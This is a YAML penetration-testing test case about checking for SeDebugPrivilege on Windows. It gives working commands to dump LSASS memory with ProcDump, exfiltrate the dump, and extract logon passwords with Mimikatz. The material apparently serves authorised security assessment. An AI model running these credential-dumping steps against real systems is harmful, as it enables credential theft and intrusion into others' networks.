---
testcase: Check if SeDebugPrivilege is set and if LSASS can be dumped
platforms: 
  - AD
  - Windows
methodology: 
  - BlackBox
  - GreyBox
references:
  - https://notes.dollarboysushil.com/windows-privilege-escalation/user-privileges/sedebugprivilege
attack_types:
  - PrivEsc
how-to-test: |
  **Enumeration:**
  1. Run `whoami /priv` to check for SeDebugPrivilege.
  2. Use Process Explorer to verify if SeDebugPrivilege is enabled for your user or process.

  **Exploitation:**
  3. If SeDebugPrivilege is available, dump LSASS with ProcDump:
     - Ensure procdump.exe is on the target.
     - Run: `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
  4. Exfiltrate the lsass.dmp file securely.
  5. On your local machine, run Mimikatz:
     - Execute `sekurlsa::minidump lsass.dmp`
     - Then execute `sekurlsa::logonpasswords` to extract credentials.
  6. If ProcDump is unavailable, consider using alternative tools or PowerShell scripts.
---